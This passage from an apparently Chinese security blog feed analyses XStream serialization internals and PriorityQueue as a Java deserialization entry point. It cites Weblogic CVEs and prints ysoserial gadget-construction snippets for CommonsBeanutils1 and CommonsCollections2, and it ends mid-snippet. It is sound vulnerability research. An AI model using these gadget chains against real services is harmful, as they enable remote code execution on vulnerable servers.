class="name">xstream.test.Student</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2、XStream序列化机制"><a href="#2、XStream序列化机制" class="headerlink" title="2、XStream序列化机制"></a>2、XStream序列化机制</h4><table><thead><tr><th>重要部分</th><th>描述</th></tr></thead><tbody><tr><td>AbstractDriver</td><td>为XStream提供流解析器和编写器</td></tr><tr><td>MarshallingStrategy</td><td>编组和解组策略的核心接口，两个方法：marshal-编组对象图、unmarshal-解组对象图</td></tr><tr><td>Mapper</td><td>映射器，XML的elementName通过mapper获取对应类、成员、属性的class对象。支持解组和编组，所以方法是成对存在real   和serialized，他的子类<strong>MapperWrapper</strong>作为装饰者，包装了不同类型映射的映射器，如AnnotationMapper，ImplicitCollectionMapper，ClassAliasingMapper。</td></tr><tr><td>ConverterLookup</td><td>通过Mapper获取的Class对象来得到相应的Class转换器，并将其转化成对应实例对象。DefaultConverterLookup是该接口的实现类，同时实现了ConverterRegistry的接口，具备查找converter功能和注册converter功能。</td></tr><tr><td>TreeMarshaller和TreeUnmarshaller</td><td>树编组和树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。它的抽象子类AbstractTreeMarshallingStrategy有抽象两个方法  createUnmarshallingContext  createMarshallingContext  用来根据不同的场景创建不同的<strong>TreeUnmarshaller</strong>子类和<strong>TreeMarshaller</strong>子类，使用了<strong>策略模式</strong>，如ReferenceByXPathMarshallingStrategy创建ReferenceByXPathUnmarshaller，ReferenceByIdMarshallingStrategy创建ReferenceByIdUnmarshaller</td></tr></tbody></table><h4 id="对象转xml字符串过程分析："><a href="#对象转xml字符串过程分析：" class="headerlink" title="对象转xml字符串过程分析："></a>对象转xml字符串过程分析：</h4><p>XStream.toXML方法如下，整个过程主要调用marshal处理，marshal主要用于编组对象图：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toXML</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个StringWriter，字符串缓冲区</span></span><br><span class="line">    Writer writer = <span class="keyword">new</span> StringWriter();</span><br><span class="line">    <span class="keyword">this</span>.toXML(obj, (Writer)writer);</span><br><span class="line">    <span class="keyword">return</span> writer.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toXML</span><span class="params">(Object obj, Writer out)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// HierarchicalStreamDriver的实现类为AbstractDriver，使用XML DOM解析，把整个XML加载进内存，缺点是占内存。</span></span><br><span class="line">    <span class="comment">// 这里调用的是AbstractXppDriver.createWriter</span></span><br><span class="line">    HierarchicalStreamWriter writer = <span class="keyword">this</span>.hierarchicalStreamDriver.createWriter(out);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.marshal(obj, writer);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        writer.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xStream.marshal()最终会调用到AbstractTreeMarshallingStrategy.marshal()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object obj, HierarchicalStreamWriter writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.marshal(obj, writer, (DataHolder)<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object obj, HierarchicalStreamWriter writer, DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.marshallingStrategy.marshal(writer, obj, <span class="keyword">this</span>.converterLookup, <span class="keyword">this</span>.mapper, dataHolder);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractTreeMarshallingStrategy.marshal</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(HierarchicalStreamWriter writer, Object obj, ConverterLookup converterLookup, Mapper mapper, DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 通过TreeMarshaller处理</span></span><br><span class="line">    TreeMarshaller context = <span class="keyword">this</span>.createMarshallingContext(writer, converterLookup, mapper);</span><br><span class="line">    context.start(obj, dataHolder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TreeMarshaller.start如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(Object item, DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataHolder = dataHolder;</span><br><span class="line">    <span class="keyword">if</span> (item == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.writer.startNode(<span class="keyword">this</span>.mapper.serializedClass((Class)<span class="keyword">null</span>));</span><br><span class="line">        <span class="keyword">this</span>.writer.endNode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 每个元素以开始节点和结束节点为一组，如&lt;xstream.test.Student&gt;和&lt;/xstream.test.Student&gt;</span></span><br><span class="line">        ExtendedHierarchicalStreamWriterHelper.startNode(<span class="keyword">this</span>.writer, <span class="keyword">this</span>.mapper.serializedClass(item.getClass()), item.getClass());</span><br><span class="line">        <span class="keyword">this</span>.convertAnother(item);</span><br><span class="line">        <span class="keyword">this</span>.writer.endNode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TreeMarshaller.convertAnother调用DefaultConverterLookup.lookupConverterForType找查找转换器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">convertAnother</span><span class="params">(Object item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.convertAnother(item, (Converter)<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">convertAnother</span><span class="params">(Object item, Converter converter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="keyword">null</span>) &#123;</span><br><span class="line">        converter = <span class="keyword">this</span>.converterLookup.lookupConverterForType(item.getClass());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!converter.canConvert(item.getClass())) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.convert(item, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过DefaultConverterLookup.lookupConverterForType找到类对应的转换器，然后调用TreeMarshaller.convert进行转换。(AbstractReferenceMarshaller)TreeMarshaller.convert逻辑是调用对应转换器的doMarshal方法，如实现了Serializable的对象转换器是SerializableConverter，调用的是SerializableConverter.doMarshal</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">convert</span><span class="params">(Object item, Converter converter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getMapper().isImmutableValueType(item.getClass())) &#123;</span><br><span class="line">        converter.marshal(item, <span class="keyword">this</span>.writer, <span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SerializableConverter.doMarshal中核心是defaultWriteObject方法，该方法主要实现序列化所有属性域信息，和上面所述一样，按照属性的类对应的转换器来调用转换器的doMarshal方法，以此逻辑将所有属性信息序列化。比如本例中School对应的转换器是ReflectionConverter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">defaultWriteObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> writtenDefaultFields = <span class="keyword">false</span>;</span><br><span class="line">    ObjectStreamClass objectStreamClass = ObjectStreamClass.lookup(currentType[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (objectStreamClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ObjectStreamField[] fields = objectStreamClass.getFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 循环序列化所有属性</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; ++i) &#123;</span><br><span class="line">            ObjectStreamField field = fields[i];</span><br><span class="line">            Object value = SerializableConverter.<span class="keyword">this</span>.readField(field, currentType[<span class="number">0</span>], source);</span><br><span class="line">            <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!writtenClassWrapper[<span class="number">0</span>]) &#123;</span><br><span class="line">                    writer.startNode(SerializableConverter.<span class="keyword">this</span>.mapper.serializedClass(currentType[<span class="number">0</span>]));</span><br><span class="line">                    writtenClassWrapper[<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!writtenDefaultFields) &#123;</span><br><span class="line">                    writer.startNode(<span class="string">"default"</span>);</span><br><span class="line">                    writtenDefaultFields = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (SerializableConverter.<span class="keyword">this</span>.mapper.shouldSerializeMember(currentType[<span class="number">0</span>], field.getName())) &#123;</span><br><span class="line">                    Class actualType = value.getClass();</span><br><span class="line">                    ExtendedHierarchicalStreamWriterHelper.startNode(writer, SerializableConverter.<span class="keyword">this</span>.mapper.serializedMember(source.getClass(), field.getName()), actualType);</span><br><span class="line">                    Class defaultType = SerializableConverter.<span class="keyword">this</span>.mapper.defaultImplementationOf(field.getType());</span><br><span class="line">                    <span class="keyword">if</span> (!actualType.equals(defaultType)) &#123;</span><br><span class="line">                        String attributeName = SerializableConverter.<span class="keyword">this</span>.mapper.aliasForSystemAttribute(<span class="string">"class"</span>);</span><br><span class="line">                        <span class="keyword">if</span> (attributeName != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            writer.addAttribute(attributeName, SerializableConverter.<span class="keyword">this</span>.mapper.serializedClass(actualType));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    context.convertAnother(value);</span><br><span class="line">                    writer.endNode();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (writtenClassWrapper[<span class="number">0</span>] &amp;&amp; !writtenDefaultFields) &#123;</span><br><span class="line">            writer.startNode(<span class="string">"default"</span>);</span><br><span class="line">            writer.endNode();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (writtenDefaultFields) &#123;</span><br><span class="line">            writer.endNode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了默认的序列化方法，在SerializableConverter.doMarshal中支持重写方法writeObject的调用，所以当类实现了Serializable并且重写了writeObject，则会调用重写的writeObject。一般在重写的writeObject方法中还是会调用SerializableConverter.defaultWriteObject方法来进行属性的序列化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.serializationMembers.callWriteObject(currentType[0], source, objectOutputStream);</span><br></pre></td></tr></table></figure><p>反序列化fromXML类似，不再分析。</p><h4 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h4><p>不论是xml形式还是json形式还是Java原生序列化，本质都是将对象以某种形式表现出来，各种形式的序列化最终都是<strong>序列化类信息和该对象的属性域信息</strong>。</p><h4 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h4><p><a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener">https://www.jianshu.com/p/387c568faf62</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> XStream </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列化 </tag>
            
            <tag> XStream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化入口PriorityQueue分析及相关Gadget总结</title>
      <link href="2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3PriorityQueue%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3Gadget%E6%80%BB%E7%BB%93/"/>
      <url>2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3PriorityQueue%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3Gadget%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/250800" target="_blank" rel="noopener">https://www.anquanke.com/post/id/250800</a></p><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>最近分析了下Weblogic CVE-2020-14654和CVE-2020-14841的Gadget，里面都用到了PriorityQueue作为入口。在ysoserial中也有不少链用到了PriorityQueue，这里做下分析和总结。</p><h3 id="二、PriorityQueue"><a href="#二、PriorityQueue" class="headerlink" title="二、PriorityQueue"></a>二、PriorityQueue</h3><p>PriorityQueue是一个用来处理优先队列的类，位于java.util包中。PriorityQueue其本质还是数组，数据结构其实是二叉堆。</p><p><img src="/imgs/image-20210817154157853.png" alt="优先队列结构图"></p><p>PriorityQueue中跟反序列漏洞相关的属性和方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 属性</span></span><br><span class="line"><span class="keyword">transient</span> Object[] queue; <span class="comment">//队列</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> size = <span class="number">0</span>; <span class="comment">//队列元素个数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="keyword">super</span> E&gt; comparator; <span class="comment">//比较器</span></span><br><span class="line"><span class="comment">// 方法</span></span><br><span class="line">java.util.PriorityQueue.heapify <span class="comment">//堆排序</span></span><br><span class="line">java.util.PriorityQueue.siftDown <span class="comment">//比较节点</span></span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator</span><br><span class="line">java.util.PriorityQueue.readObject <span class="comment">//反序列化读取</span></span><br></pre></td></tr></table></figure><h4 id="PriorityQueue-heapify最小堆排序"><a href="#PriorityQueue-heapify最小堆排序" class="headerlink" title="PriorityQueue.heapify最小堆排序"></a>PriorityQueue.heapify最小堆排序</h4><p>heapify的作用是排序，调整优先队列的节点保证是一个最小堆，从而建立一个优先队列。其排序的过程是将一个节点和它的子节点进行比较调整，保证它比它所有的子节点都要小，这个调整的顺序是从当前节点向下，一直调整到叶节点。 </p><p>heapify主要调用siftDown处理。siftDown对有比较器comparator和没有比较器的情况做了分类处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>siftDownComparable主要处理一些常见类型的排序，被比较的实例的类都需要实现Comparable接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownComparable</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    Comparable&lt;? <span class="keyword">super</span> E&gt; key = (Comparable&lt;? <span class="keyword">super</span> E&gt;)x;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;        <span class="comment">// loop while a non-leaf</span></span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="comment">// 左节点</span></span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>; <span class="comment">// assume left child is least</span></span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="comment">// 右节点</span></span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 调用Comparable.compareTo比较</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; ((Comparable&lt;? <span class="keyword">super</span> E&gt;) c).compareTo((E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 左节点&gt;右节点，调整当前节点值是右节点的值，也就是小的那个</span></span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (key.compareTo((E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//左节点的值赋给当前节点</span></span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>siftDownUsingComparator主要用比较器Comparator来进行排序，如下会调用comparator.compare方法来处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="comment">// 左节点</span></span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="comment">// 右节点</span></span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 调用comparator.compare方法比较左右节点</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 左节点&gt;右节点，调整当前节点值是右节点的值，也就是小的那个</span></span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="comment">// 调用comparator.compare方法比较当前节点和c</span></span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PriorityQueue的writeObject和readObject"><a href="#PriorityQueue的writeObject和readObject" class="headerlink" title="PriorityQueue的writeObject和readObject"></a>PriorityQueue的writeObject和readObject</h4><p>PriorityQueue处理反序列化时比较简单，主要是两部分：读取元素个数来创建一个数组，并将元素读取后赋值给数组，这是一个初始队列，第二部分是调用heapify将队列进行最小堆排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 调用ObjectOutputStream.defaultWriteObject写入PriorityQueue的可序列化属性信息</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入数组长度</span></span><br><span class="line">    s.writeInt(Math.max(<span class="number">2</span>, size + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按顺序写入队列所有元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        s.writeObject(queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">//读取size及其他属性</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">   <span class="comment">//读数组长度</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    <span class="comment">//创建一个长度为size的数组</span></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"><span class="comment">//读取所有元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、PriorityQueue和Gadget关系"><a href="#三、PriorityQueue和Gadget关系" class="headerlink" title="三、PriorityQueue和Gadget关系"></a>三、PriorityQueue和Gadget关系</h3><p>ysoserial中以PriorityQueue作为反序列化入口的有：CommonsBeanutils1、CommonsCollections2、CommonsCollections4、BeanShell1、Jython1。</p><p><img src="/imgs/image-20210817173001458.png" alt="image-20210817173001458"></p><h4 id="CommonsBeanutils1："><a href="#CommonsBeanutils1：" class="headerlink" title="CommonsBeanutils1："></a>CommonsBeanutils1：</h4><p>以PriorityQueue作为入口，以BeanComparator为Comparator比较器，调用BeanComparator.compare，BeanComparator.compare通过PropertyUtilsBean可调用Method.invoke。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">"queue"</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = templates;</span><br></pre></td></tr></table></figure><h4 id="CommonsCollections2："><a href="#CommonsCollections2：" class="headerlink" title="CommonsCollections2："></a>CommonsCollections2：</h4><p>以PriorityQueue作为入口，TransformingComparator作为Comparator，调用TransformingComparator.compare，该方法可调用InvokerTransformer.transform从而调用Method.invoke。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) 